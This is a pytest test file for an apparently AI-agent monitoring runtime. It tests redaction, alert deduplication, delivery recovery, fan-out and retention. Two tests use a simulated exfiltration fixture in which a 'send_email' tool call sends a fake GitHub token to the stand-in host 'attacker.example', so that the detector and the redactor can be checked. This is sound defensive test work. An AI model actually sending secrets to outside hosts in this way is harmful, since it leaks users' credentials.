"""Security decisions, transactional recovery, and isolated destination delivery."""

import asyncio
import json
import sqlite3
import time

import pytest

from litmusai.runtime.config import (
    ClassifierConfig,
    EventGridDestination,
    KafkaDestination,
    ThreatPolicy,
)
from litmusai.runtime.detectors import ClassifierVerdict, sensitive_data, tool_policy
from litmusai.runtime.engine import Engine
from litmusai.runtime.models import Message, ToolActivity
from litmusai.runtime.publishers import PublishError
from litmusai.runtime.redaction import Redactor
from litmusai.runtime.store import Store


async def drain(engine, semantic=False):
    while await engine.process_one("p", semantic):
        pass


def accept(store, config, event):
    return store.accept(Redactor(config.projects[0].policy).capture(event), config.projects[0])


async def test_duplicate_events_and_tool_stages_create_one_alert_with_revisions(
    config,
    store,
    make_event,
):
    event = make_event()
    assert accept(store, config, event) == "accepted"
    assert accept(store, config, event) == "duplicate"
    engine = Engine(store, config)
    await drain(engine)
    first = store.alerts("p")
    assert len(first) == 1 and first[0]["stage"] == "requested"
    completed = event.model_copy(
        update={"event_id": "completed", "sequence": 2, "event_type": "tool.completed"}
    )
    assert accept(store, config, completed) == "accepted"
    await drain(engine)
    updated = store.alerts("p")
    assert len(updated) == 1 and updated[0]["revision"] == 2
    assert updated[0]["alert_id"] == first[0]["alert_id"] and updated[0]["stage"] == "observed"
    assert len(store.alert("p", first[0]["alert_id"])["deliveries"]) == 2
    assert store.alerts("unrelated") == []


async def test_late_requests_never_downgrade_observed_stage(config, store, make_event):
    event = make_event(event_type="tool.completed", sequence=2)
    engine = Engine(store, config)
    accept(store, config, event)
    await drain(engine)
    accept(
        store,
        config,
        event.model_copy(
            update={"event_id": "late", "event_type": "tool.requested", "sequence": 1}
        ),
    )
    await drain(engine)
    assert store.alerts("p")[0]["stage"] == "observed"
    assert store.status("p")["capture_gaps"] >= 1


def test_unknown_context_and_allowed_tools_do_not_invent_violations(make_event, policy):
    event = make_event(payload=ToolActivity(name="send_email"))
    captured = Redactor(policy).capture(event)
    findings = tool_policy(captured, policy)
    assert [f.outcome for f in findings] == ["clear", "insufficient_context"]
    assert tool_policy(captured, ThreatPolicy())[0].outcome == "insufficient_context"
    denied = tool_policy(captured, ThreatPolicy(allowed_tools=[]))
    assert denied[0].outcome == "detected"


async def test_secret_redaction_precedes_persistence_and_outbound_exposure_detection(
    config,
    store,
    make_event,
):
    protected = "ghp_" + "A" * 36
    event = make_event(
        payload=ToolActivity(
            name="send_email", destination="attacker.example", arguments={protected: [protected]}
        )
    )
    accept(store, config, event)
    await drain(Engine(store, config))
    alerts = store.alerts("p")
    assert {a["category"] for a in alerts} == {"forbidden_destination", "sensitive_data"}
    assert protected not in "\n".join(store.db.iterdump())
    assert "[REDACTED]" in store.captured("p", event.event_id).event.model_dump_json()


def test_inbound_tool_result_is_not_treated_as_outbound_exfiltration(policy, make_event):
    event = make_event(
        event_type="tool.completed",
        payload=ToolActivity(
            name="send_email", destination="attacker.example", result="ghp_" + "A" * 36
        ),
    )
    findings = sensitive_data(Redactor(policy).capture(event), policy)
    assert findings[0].outcome == "clear"


def test_secret_in_metadata_and_deep_nesting_are_rejected(policy, make_event):
    with pytest.raises(ValueError, match="metadata"):
        Redactor(policy).capture(make_event(actor_id="ghp_" + "A" * 36))
    payload = []
    for _ in range(20):
        payload = [payload]
    with pytest.raises(ValueError, match="nesting"):
        Redactor(policy).capture(make_event(payload=ToolActivity(name="tool", result=payload)))


async def test_atomic_outbox_rollback_and_recovery(config, store, make_event):
    accept(store, config, make_event())
    store.db.execute(
        "CREATE TRIGGER delivery_failure BEFORE INSERT ON deliveries "
        "BEGIN SELECT RAISE(ABORT, 'simulated crash'); END;"
    )
    engine = Engine(store, config)
    with pytest.raises(sqlite3.IntegrityError):
        await drain(engine)
    assert store.alerts("p") == []
    assert store.db.execute("SELECT COUNT(*) FROM revisions").fetchone()[0] == 0
    store.db.execute("DROP TRIGGER delivery_failure")
    with store.db:
        store.db.execute("UPDATE jobs SET lease_until=0")
    await drain(engine)
    assert len(store.alerts("p")) == 1
    assert store.db.execute("SELECT COUNT(*) FROM deliveries").fetchone()[0] == 1


async def test_restart_recovers_delivery_with_original_event_and_destination_snapshot(
    config,
    make_event,
):
    first = Store(config.database)
    accept(first, config, make_event())
    await drain(Engine(first, config))
    claimed = first.claim_delivery("webhook")
    with first.db:
        first.db.execute("UPDATE deliveries SET lease_until=0")
    first.close()
    restarted = Store(config.database)
    try:
        recovered = restarted.claim_delivery("webhook")
        assert recovered["id"] == claimed["id"] and recovered["event"] == claimed["event"]
        assert recovered["content"] == claimed["content"]
        assert recovered["config"] == claimed["config"]
        # A late acknowledgement from an obsolete lease cannot overwrite the new attempt.
        restarted.finish_delivery(claimed)
        assert restarted.db.execute("SELECT state FROM deliveries").fetchone()[0] == "leased"
        restarted.finish_delivery(recovered)
        assert restarted.db.execute("SELECT state FROM deliveries").fetchone()[0] == "acknowledged"
    finally:
        restarted.close()


async def test_failure_isolation_canonical_fanout_and_replay(config, store, make_event):
    kafka = KafkaDestination(
        destination_id="kafka",
        project_id="p",
        bootstrap_servers="broker:9092",
        topic="alerts",
        max_attempts=1,
    )
    grid = EventGridDestination(
        destination_id="grid", project_id="p", endpoint="https://topic.example/api/events"
    )
    config = config.model_copy(update={"destinations": [*config.destinations, kafka, grid]})
    bodies = {}

    class Publisher:
        def __init__(self, destination):
            self.destination = destination

        async def publish(self, body, delivery_id):
            bodies[self.destination] = body
            if self.destination == "kafka":
                raise PublishError("kafka_down")

    engine = Engine(store, config, publisher_factory=lambda c: Publisher(c.destination_id))
    accept(store, config, make_event())
    await drain(engine)
    await asyncio.gather(
        engine.publish_one("webhook"), engine.publish_one("kafka"), engine.publish_one("grid")
    )
    assert bodies["webhook"] == bodies["kafka"] == bodies["grid"]
    status = store.status("p")["destinations"]
    assert {s["state"] for s in status} == {"acknowledged", "failed"}
    row = store.db.execute("SELECT * FROM deliveries WHERE destination='kafka'").fetchone()
    assert not store.replay("unrelated", row["id"])
    assert store.replay("p", row["id"])
    replayed = store.claim_delivery("kafka")
    assert replayed["id"] == row["id"] and replayed["event"] == row["event"]


async def test_slow_classifier_does_not_delay_local_alert_or_healthy_destination(
    config,
    store,
    make_event,
):
    settings = ClassifierConfig(
        endpoint="https://classifier.example",
        api_key_env="CLASSIFIER_KEY",
        version="1",
        timeout_seconds=0.2,
    )
    project = config.projects[0].model_copy(update={"classifier": settings})
    config = config.model_copy(update={"projects": [project]})
    received = asyncio.Event()

    class Classifier:
        async def classify(self, captured, context, incomplete):
            await asyncio.sleep(10)

    class Publisher:
        async def publish(self, body, delivery_id):
            received.set()

    engine = Engine(
        store, config, classifiers={"p": Classifier()}, publisher_factory=lambda c: Publisher()
    )
    accept(store, config, make_event(event_type="tool.completed"))
    await engine.start()
    try:
        await asyncio.wait_for(received.wait(), 1)
        await asyncio.sleep(0.3)
        assert store.status("p")["detector_outcomes"]["prompt_injection"]["error"] == 1
    finally:
        await engine.stop()


async def test_classifier_gets_only_sanitized_scoped_context_and_budget_is_persisted(
    config,
    store,
    make_event,
):
    settings = ClassifierConfig(
        endpoint="https://classifier.example",
        api_key_env="CLASSIFIER_KEY",
        version="model-v2",
        calls_per_minute=1,
    )
    project = config.projects[0].model_copy(update={"classifier": settings})
    config = config.model_copy(update={"projects": [project]})
    seen = []

    class Classifier:
        async def classify(self, captured, context, incomplete):
            seen.append((captured, context))
            return ClassifierVerdict(outcome="detected", reason="ghp_" + "B" * 36)

    engine = Engine(store, config, classifiers={"p": Classifier()})
    for i in range(2):
        accept(
            store,
            config,
            make_event(
                event_type="context.received",
                tool_call_id=None,
                payload=Message(text="ghp_" + "A" * 36, role="context"),
            ),
        )
    await drain(engine, semantic=True)
    assert len(seen) == 1 and seen[0][0].event.payload.text == "[REDACTED]"
    assert store.alerts("p")[0]["reason"] == "[REDACTED]"
    assert store.status("p")["detector_outcomes"]["prompt_injection"] == {
        "detected": 1,
        "skipped": 1,
    }
    assert store.alerts("p")[0]["detector_version"] == "model-v2"


def test_context_is_scoped_and_truncation_visible(config, store, make_event):
    for i in range(3):
        accept(store, config, make_event(session_id="other" if i == 0 else "session"))
    last = make_event()
    accept(store, config, last)
    context, incomplete = store.context(store.captured("p", last.event_id), 1)
    assert len(context) == 1 and context[0].event.session_id == "session" and incomplete


def test_quota_conflict_and_config_version_checks(config, store, make_event):
    project = config.projects[0].model_copy(update={"max_pending_events": 1})
    event = make_event()
    assert store.accept(Redactor(project.policy).capture(event), project) == "accepted"
    assert store.accept(Redactor(project.policy).capture(make_event()), project) == "busy"
    conflicting = event.model_copy(update={"agent_id": "different"})
    assert store.accept(Redactor(project.policy).capture(conflicting), project) == "conflict"
    changed = config.model_copy(
        update={
            "destinations": [
                config.destinations[0].model_copy(update={"url": "https://different.example"})
            ]
        }
    )
    with pytest.raises(ValueError, match="version"):
        store.register_config(changed)


async def test_retention_removes_payloads_and_delivery_history(config, store, make_event):
    accept(store, config, make_event())
    await drain(Engine(store, config))
    old = time.time() - 10 * 86400
    with store.db:
        for table in ["jobs", "findings", "deliveries", "revisions"]:
            store.db.execute(f"UPDATE {table} SET created=?", (old,))
        store.db.execute("UPDATE events SET received=?", (old,))
        store.db.execute("UPDATE alerts SET updated=?", (old,))
    store.cleanup(7)
    assert store.alerts("p") == []
    assert store.db.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 0


async def test_route_filters_and_equivalent_findings_suppression(config, store, make_event):
    destination = config.destinations[0].model_copy(update={"categories": ["sensitive_data"]})
    config = config.model_copy(update={"destinations": [destination]})
    event = make_event()
    accept(store, config, event)
    engine = Engine(store, config)
    await drain(engine)
    accept(store, config, event.model_copy(update={"event_id": "repeat", "sequence": 2}))
    await drain(engine)
    assert len(store.alerts("p")) == 1
    assert store.alerts("p")[0]["revision"] == 1
    assert store.status("p")["suppressed"] == 1
    assert store.db.execute("SELECT COUNT(*) FROM deliveries").fetchone()[0] == 0
    # Findings survive notification suppression.
    rows = store.db.execute("SELECT content FROM findings WHERE suppressed=1").fetchall()
    assert json.loads(rows[0][0])["event_id"] == "repeat"
